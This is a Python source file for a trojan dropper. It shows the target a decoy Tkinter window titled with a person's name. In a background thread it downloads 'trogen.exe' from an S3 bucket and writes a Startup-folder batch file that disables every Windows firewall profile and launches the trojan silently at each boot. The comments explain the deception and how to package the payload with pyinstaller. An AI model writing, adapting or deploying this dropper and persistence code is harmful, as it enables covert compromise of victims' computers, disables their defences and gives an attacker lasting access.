import tkinter as tk
import threading
import boto3
import os

'''
# This is a fake program which we present to the target.
# When the user runs the program the application will create a .bat file to the start up folder
# and copy the trogen to a different location.
# Now on each windows start, the bat file will be executed which in turn will execute the trogen in background and expose the system to the host
'''
def open_fake_program():
    window = tk.Tk()
    window.title("Aravind R Pillai")
    window.geometry("300x200")
    label = tk.Label(window, text="\n\nThis is fake program to load the \nactual files to the guest system. ")
    label.pack()
    label = tk.Label(window, text="\nAravind R Pillai. \n")
    label.pack()
    button = tk.Button(window, text="You don't need to click me")
    button.pack()
    window.mainloop()

'''
#Function to copy the trogen file to the host machine
    # 1. Create the exe file of "trogen.py" and place it in a shared location (eg: aws s3) 
    # 2. Code below downloads that .exe file from s3 and save it to a location on the guest machine
    # 3. Done 
    # To create exe file --> pyinstaller --onefile --noconsole trogen.py  (after -> pip install pyinstaller )
'''
def copy_trogen_to_disk():
    s3 = boto3.client('s3')
    s3.download_file("trogen_bucket", "trogen.exe", "C:/tmp/trogen.exe")

'''
# Function to create the start up file 
# This spins up the trogen on windows start 
'''    
def create_startup_file():
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "trogen_startup.bat")
    try:
        with open(startup_folder, 'w') as file:
            file.write("@echo off \n")
            file.write("netsh advfirewall set allprofiles state off \n")
            file.write("start /B C:/tmp/trogen.exe")
        print("Content successfully written to the file. : {}".format(startup_folder))
    except IOError:
        print("Error: Unable to write to the file.")

def load_trogen():
    copy_trogen_to_disk()
    create_startup_file()

if __name__ == '__main__':  
    load_trogen_thread = threading.Thread(target=load_trogen, args=())
    open_fake_program_thread = threading.Thread(target=open_fake_program, args=())
    
    load_trogen_thread.start()
    open_fake_program_thread.start()





